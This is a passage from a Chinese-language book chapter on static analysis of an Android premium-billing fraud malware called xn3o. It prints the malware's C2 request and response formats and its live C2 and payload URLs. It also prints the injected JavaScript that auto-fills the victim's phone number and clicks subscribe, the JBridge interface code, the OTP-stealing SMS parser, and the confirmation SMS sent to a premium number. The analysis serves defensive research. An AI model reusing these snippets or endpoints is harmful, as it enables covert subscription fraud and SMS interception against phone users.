`worikt`和`zubfih`的含义不太明显，但通过追踪代码到这两个变量的赋值过程，可以理解它们的含义：`worikt`是设备的 SIM 卡运营商代码，由`TelephonyManager.getSimOperator`返回（20610 代码代表比利时的运营商 Orange）。`zubfih`的值则更复杂。根据设备的 API 级别，该值要么设置为应用安装时间的 Unix 时间戳，要么设置为设备的 Android ID。

#### ***处理注册响应***

成功注册请求后，命令与控制服务器会响应一个字符串，解密后得到清单 3-26 中显示的 JSON 对象。

```
{
  "bshwai": 4904276,
  "xjnguw": ""
}
```

*清单 3-26：新客户端注册的命令与控制服务器响应*

`bshwai`返回值的确切含义尚不清楚，但它可能是分配给客户端的 ID。使用 cURL 探测命令与控制服务器会返回相同的`bshwai`值，直到在`zubfih`请求字段中发送一个新的时间戳值。很可能，服务器使用安装时间戳来区分被感染的客户端，并基于此分配新的客户端 ID。由于客户端 ID 似乎是线性递增的，因此也有可能使用此值来估算感染设备的数量，以及新设备的感染速度。

第二个返回值`xjnguw`也非常有趣。在我们的测试中，它几乎总是为空。它似乎依赖于应用的包名，因为当我们将`josiwo`中的包名参数更改为例如*com.takela.message*（另一个同一恶意软件家族中的恶意软件样本的包名）时，服务器返回了一个非空值。返回的非空值像是*1_1487372418053478*，其中下划线前面的 1（或有时是 2）是第四阶段下载的版本标识符，下划线后的部分是用于初始化 Facebook SDK 的 Facebook 应用 ID，Facebook SDK 被打包在第四阶段中。第四阶段从*https://xn3o.oss-accelerate.aliyuncs.com/fbhx1*或*https://xn3o.oss-accelerate.aliyuncs.com/fbhx2*下载，具体取决于版本号。在本章的最后，我们将看看这些插件。

#### ***下载命令***

在与命令与控制服务器注册后，恶意软件会连接到*https://www.utansy.com/xn3o/ti*以检索要执行的命令。这些命令用于连接到一个关联网站，该网站将转发到一个支付注册页面。一旦页面加载完毕，下载的命令会开始与之交互，并在用户不知情的情况下进行注册。用户将在下一个电话账单中被收费，而引导用户注册的关联方将获得奖励。

发送到命令 URL 的请求有效载荷包含恶意软件收集的有关设备状态的信息。清单 3-27 显示了一个请求示例。

```
{
  "zubfih": "1646292590992_",
  "bshwai": 4904276,
  "eymbmw": true,
  "tffhhk":
  {
    "rktfht": false,
    "segdip": false,
    "elbcnf": "+3214137764",
    "dgebpf":
    [
      "sp@porst.tv",
      "@LambdaCube"
    ]
  }
}
```

*清单 3-27：发送到命令与控制服务器的有效载荷，请求命令*

`eymbmw` 字段指示设备是否处于移动网络状态（设备需要移动连接才能注册到许多运营商账单站点）。`rktfht` 字段指示应用程序是否有权限接收短信或访问应用通知，应用程序需要此权限才能获取账单注册过程中的一次性密码。`segdip` 字段指示应用程序是否有权限发送短信，这对于在某些页面上确认账单注册是必需的。`elbcnf` 字段包含设备的电话号码，而 `dgebpf` 列出了与设备注册的所有账户。根据设备的不同，注册的账户可以是某人的电子邮件地址、WhatsApp 号码、X 账户句柄或 LinkedIn 个人资料 ID。目前尚不清楚为什么恶意软件会收集这些信息。还包括了注册请求中看到的 `zubfih` 和 `bshwai` 值。

#### ***处理命令与控制服务器的响应***

解释从命令 URL 接收到的响应是困难的，但列表 3-28 展示了两个最明显的字段。

```
{
  "lybfta":
  [
    {
      "ejqgpk": 42698996,
      "gooycf": "https://d624x9ov.com/dVZjL5Vo?campaign=10372
                 &sub_aff=42698996&sub_aff3=EZ",
      "inbzrz": 200,
      "hyszxc": false,
      "eymbmw": false,
      "gkreil":
      [
        {
          "ejqgpk": 7198,
          "xjnguw": 100,
          "jxdkqb": "try{window.JBridge.call('log','v1');
          var phone_input=document.querySelector('#phone-input');
          var phone_submit=document.querySelector('#phone-continue-button');
          if(phone_input!=null&&phone_input.offsetHeight>0){
            window.JBridge.call('log','  phone');
            phone_input.value='0'+'214137764';
            window.JBridge.call('log','214137764');
            var event=document.createEvent('HTMLEvents');
            event.initEvent('input',true,true);
            phone_input.dispatchEvent(event);
            phone_submit.click();
            nextThings();
            ...
          }",
          "gooycf": "https?://s.premium-be-ex.digi-place.com/\\?q.*"
        }
      ]
    }
  ],
  "jxdkqb":
  {}
}
```

*列表 3-28：响应包含用于导航注册页面的 JavaScript 代码。*

`gooycf` 字段包含要在欺诈的下一步加载的附属 URL。`jxdkqb` 字段包含一系列 JavaScript 指令。这些指令使用注入到高级注册网站中的 JavaScript 桥接对象，允许恶意 JavaScript 代码与 *xn3o* 中的恶意 Java 代码进行交互。

**注意**

*在服务器返回的原始 JSON 响应中，这段 JavaScript 代码是单行显示的。我们在这里对其进行了格式化，使其更易于阅读。我们还对其进行了简化，因为它非常长。*

#### ***秘密注册高级服务***

在附属 URL 和 JavaScript 命令被下载后，恶意软件将在定制的 WebView 中打开附属 URL。WebView 的所有定制都涉及拦截加载的网站并对其进行操控，部分目的是绕过注册页面上的反机器人保护，部分目的是与注册页面进行交互，模拟合法用户。

在移动网页浏览器中，打开命令响应有效负载中显示的附属 URL 会重定向到图 3-3 所示的站点。

![图片](img/ch03fig03.jpg)

*图 3-3：比利时高级服务注册页面*

这是高级服务订阅过程的第一阶段，用户在此输入其电话号码。在底部的小字中，透露了该服务的费用为每周六欧元，并提供了退订说明。

#### ***设置 JavaScript 桥接***

在注册页面加载完成后，恶意软件开始通过*JavaScript 接口*与其交互，Java 接口标准 Android API 允许应用程序在 WebView 对象中创建与网站之间的桥接。简单的 jadx 搜索 Android API `addJavascriptInterface`可以显示恶意软件在*xn3o*中发生的位置（清单 3-29）。

```
public vgy7(Context context, vgy7.vgy7.vgy7.vgy7.mko0.vgy7 vgy7Var) {
  this.f10vgy7 = new nji9(context);
  ...
  WebSettings settings = this.f10vgy7.getSettings();
  settings.setJavaScriptEnabled(true);
  settings.setCacheMode(2);
  settings.setMixedContentMode(0);
  settings.setDomStorageEnabled(true);
  settings.setUserAgentString(vgy7.vgy7.vgy7.vgy7.bhu8.zse4);
  settings.setJavaScriptCanOpenWindowsAutomatically(true);
  ...
  this.f10vgy7.addJavascriptInterface(
    new zse4(), vgy7.vgy7.vgy7.vgy7.vgy7.rfv4);
  this.f10vgy7.setWebChromeClient(new mko0());
  this.f10vgy7.setWebViewClient(new cft6());
}
```

*清单 3-29：设置 JavaScript 接口以操作注册页面*

`addJavascriptInterface`传递的第一个参数是一个 Java 对象，它可以从加载到 WebView 中的网站访问。第二个参数是该对象在 JavaScript 中应赋予的名称。JavaScript 代码可以使用这个名称来引用该对象并调用定义在该对象中的方法。在恶意软件中，这个名称就是`JBridge`。

Java 类`zse4`定义了 JavaScript 桥接对象，它只有一个用`@JavascriptInterface`装饰器标记的方法，即`call`方法。只有标记了这个装饰器的方法才能从 JavaScript 访问，因此这是恶意软件的 JavaScript 部分可以调用的唯一方法。在`call`方法内部，有一长串`if...else`语句，这在恶意软件中通常表示一个解释命令的代码段。找到恶意软件的命令解释器是逆向工程师的宝藏，因为它能让他们看到哪些命令由哪些代码支持。这帮助逆向工程师迅速理解恶意功能的大部分内容。

根据`call`方法的参数，我们已经可以看到第一个参数是命令名称，第二个参数是命令选项。长串的`if...else`链检查命令名称，并根据命令调用不同的代码来执行。该功能的部分代码在清单 3-30 中显示。

```
if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.yhn6)) {
  vgy7.this.vgy7(Integer.parseInt(str2), 0);
} else if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.tgb5)) {
  vgy7.this.vgy7(302, Integer.parseInt(str2));
} else if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.qwe1)) {
  vgy7.vgy7.vgy7.vgy7.bhu8.nji9(str2);
} else if (str.equals(vgy7.vgy7.vgy7.vgy7.vgy7.ujm7)) {
  vgy7.this.vgy7(302, 80014);
  return vgy7.this.bhu8.bhu8(str2, 60007);
```

*清单 3-30：在 zse4 类中处理 JavaScript 命令*

在这段代码中，`str`参数依次与字符串值`finish`、`schedule`、`textTo`和`popMsg`进行比较。跟踪`if`语句内部调用的方法可以揭示支撑这些命令的代码。

#### ***与 Java 桥接对象的交互***

现在你已经了解了 JavaScript 桥接对象的 Java 实现，接下来仔细查看下载的 JavaScript 命令，见清单 3-31。

```
try {
  window.JBridge.call('log', 'v1');
  var phone_input = document.querySelector('#phone-input');
  var phone_submit = document.querySelector('#phone-continue-button');
  if (phone_input != null && phone_input.offsetHeight > 0) {
    window.JBridge.call('log', '  phone');
    phone_input.value = '0' + '214137764';
    window.JBridge.call('log', '214137764');
    var event = document.createEvent('HTMLEvents');
    event.initEvent('input', true, true);
    phone_input.dispatchEvent(event);
    phone_submit.click();
    nextThings();
  } else {
    window.JBridge.call('log', 'no phone input');
    window.JBridge.call('finish', '306');
  }
} catch (e) {
  window.JBridge.call('log', 'click error:' + e);
  window.JBridge.call('finish', '304');
}
```

*清单 3-31：JavaScript 代码用于订阅高级服务。*

首先，代码使用`querySelector`方法尝试在订阅网站上找到电话号码输入框。找到后，代码将设备的电话号码输入到该字段中，使用 JavaScript 点击订阅按钮，并调用`nextThings`方法。

列表 3-32 展示了`nextThings`中的代码摘录，许多行调用了桥接对象的`call`方法。由于桥接对象由 Java 类`zse4`定义，我们可以轻松地跟踪这些行的作用。对`zse4`的分析确认了命令名称与其含义一致：JavaScript 代码试图拦截一条传入的短信(`popMsg`)，并向号码 9956 发送确认短信以完成注册流程(`textTo`)。

```
var numm = '9956';
var kkey = 'OK';
var sms1 = numm + '---' + kkey;
var sms11 = '+' + numm + '---' + kkey;
window.JBridge.call('log', 'sms1:' + sms1);
var andupin = window.JBridge.call('popMsg', '1::(\\\\d{3,6})');
if (andupin == '9956') {
  window.JBridge.call('textTo', sms11);
  window.JBridge.call('textTo', sms1);
  window.JBridge.call('log', 'sms1');
  window.JBridge.call('finish', '100');
} else {
  window.JBridge.call('textTo', sms11);
  window.JBridge.call('textTo', sms1);
  window.JBridge.call('log', 'nopinsms1');
  window.JBridge.call('finish', '305');
}
```

*列表 3-32：有效载荷通过 JavaScript 接口 JBridge 连接 Java 和 JavaScript 代码。*

还有一个谜团：JavaScript 命令是如何在订阅网站的上下文中执行的呢？对此有一个标准的 Android API：`WebView.evaluateJavascript`，它允许应用将任何 JavaScript 代码注入到网站中。

#### ***完成注册流程***

在另一个代码位置，`vgy7Var.yhn6`列表被读取，并且拦截到的短信和通知被处理。通过在 jadx 中快速查阅，我们发现代码中唯一读取该列表的地方是在`bhu8`方法中。

如列表 3-33 所示，该方法接收一个形式为`number::string`的字符串参数，并在双冒号(`::`)处分割。该参数的第一部分作为正则表达式来解析短信。第二部分包含一个正则表达式捕获组的数字，表示预期的一次性密码的位置。该方法还接受一个整数参数，用于在找不到预期短信时使当前线程进入休眠状态。它可能这样做是为了等待短信到达，然后再次检查它。

```
public String bhu8(String str, int i) {
  String remove;
  for (int i2 = 0; i2 < 107; i2++) {
    if (this.yhn6.size() > 0 && (remove = this.yhn6.remove(0)) != null) {
      String[] split = str.split("::");
      Matcher matcher = Pattern.compile(split[1]).matcher(remove);
      if (matcher.find()) {
        return matcher.group(Integer.parseInt(split[0]));
      }
    }
    try {
      Thread.sleep(i / 107);
    } catch (InterruptedException e) {
    }
  }
  return "";
}
```

*列表 3-33：解析一次性密码*

`bhu8`方法从*xn3o*中的两个地方被调用：一次是通过硬编码的字符串参数，该参数用于解析来自某些泰国订阅网站的短信消息；另一次是从`popMsg`命令的命令处理器调用。对于比利时订阅网站，恶意软件使用的是第二种方式。我们现在知道，列表 3-34 中显示的 JavaScript 代码，之前从指挥与控制服务器下载的，实际上是一个简单的提取器，用于提取三到六位数的数字。

```
var andupin = window.JBridge.call('popMsg', '1::(\\\\d{3,6})');}
```

*列表 3-34：解析比利时注册页面的一次性密码*

调用`popMsg`方法后的行为值得注意。列表 3-32 显示，无论从短信中提取出什么数字，应用都会继续通过发送*ok*消息到电话号码 9956 来完成注册流程。虽然我们无法访问真正的比利时电话来观察完整的注册过程，但可以推测，这个增值服务根本没有使用一次性密码。也许用户可以仅仅通过向服务的增值号码发送*ok*来确认他们的订阅。

### **神秘的第四阶段**

在我们结束本章之前，快速看一下恶意软件似乎很少使用的神秘第四阶段。下载前面提到的 *fbhx1* 和 *fbhx2* 文件，并在 `jadx` 中加载它们，可以看到它们各自只有一个包名：*com.facebook.** 或 *com.facebook2.**。

在第一步中，我们可以尝试确定 *fbhx1* 和 *fbhx2* 之间的差异。`jadx` 的命令行版本在这里很有帮助，因为我们只需反编译这两个文件，然后使用标准编程工具对比生成的源代码文件夹。由于包名 *com.facebook.** 和 *com.facebook2.** 有些微差异，我们必须先将 *facebook2* 重命名为 *facebook*，才能使标准代码比较工具在输出上正常工作：

```
$ jadx fbhx1
$ jadx fbhx2
$ grep -rl facebook2 . | xargs sed -i 's/facebook2/facebook/g'
$ mv fbhx2-jadx-output/sources/com/facebook2/
    fbhx2-jadx-output/sources/com/facebook
$ diff --suppress-common-lines -r -y fbhx1-jadx-output/ fbhx2-jadx-output/
```

输出内容在此省略，只有一些看起来是由 `jadx` 反编译特性引起的差异。看起来 *fbhx1* 和 *fbhx2* 的代码在功能上是相同的。知道这一点后，我们来看看恶意软件是如何与这两个文件交互的。根据加载的文件不同，似乎 *xn3o* 仅在代码的某个部分与 *fbhx* 交互。列表 3-35 显示，恶意软件加载了 `j` 类，并分别调用了 `a` 和 `c` 方法。

```
Class loadClass = new DexClassLoader(
  file.getAbsolutePath(),
  file2.getAbsolutePath(),
  null,
  context.getClassLoader()).loadClass(
    i == 2 ? "com.facebook2.j" : "com.facebook.j");
loadClass.getMethod("a", String.class).invoke(null, str);
loadClass.getMethod("c", Context.class).invoke(null, context);
```

*列表 3-35：恶意软件加载 Facebook SDK*

对 `j` 类中的许多字符串进行快速网络搜索，发现该类原本是 `FacebookSdk`。`a` 方法实际上是 `setApplicationId`，而 `c` 方法实际上是 `sdkInitialize`。

Facebook SDK 是否是合法的，还是被恶意篡改过？这个问题的答案尚不明确，因为据我们所知，目前没有有效的公开工具可以用于查找 Android 应用中被恶意修改的 SDK。即使有这样的工具，你也必须首先找到原始的、合法的 SDK，才能与恶意软件版本进行比较。幸运的是，`FacebookSdk` 类包含了一个版本字符串，这使得这部分工作变得更容易。

在缺乏有效工具的情况下，我们只能将这个问题的答案留白。通过 `jadx` 反编译的 Facebook SDK 包含了超过 20,000 行代码，分布在 150 多个类中。这么多的代码很难手动与真实的 Facebook SDK 进行比较。而且，由于 *fbhx* 文件中的名称已被混淆，使用简单的 diff 工具几乎无法提供帮助。

### **接下来**

这完成了我们对静态 Android 恶意软件分析的介绍。你了解了可以用来静态逆向工程恶意软件代码的工具，以及许多最佳实践。

为了简洁起见，我们在解释恶意软件核心功能时省略了大量代码。例如，我们没有包括解析高级注册页面 HTML 的代码。同样，恶意软件中还包含了代码，用来破坏一些商业可用的产品，这些产品是高级服务可以授权用于防止机器人活动的注册页面保护；我们对此未作描述。

另一个未描述的部分是恶意软件复杂的消息传递系统。恶意软件的不同部分，在 Java 和 JavaScript 组件中，使用默认的 Android 消息传递系统交换消息。这些消息帮助恶意软件根据其当前状态以及注册过程的进展情况来组织和执行下一步操作。由于其异步性质以及使用广播和消息队列，跟踪这个消息传递系统并非易事。

尽管静态分析很强大，但它只是恶意软件分析的一部分，需要结合动态分析来使用。在下一章中，我们将正是这样做，我们将使用动态分析技术分析另一个恶意软件样本。

[*OceanofPDF.com*](https://oceanofpdf.com)
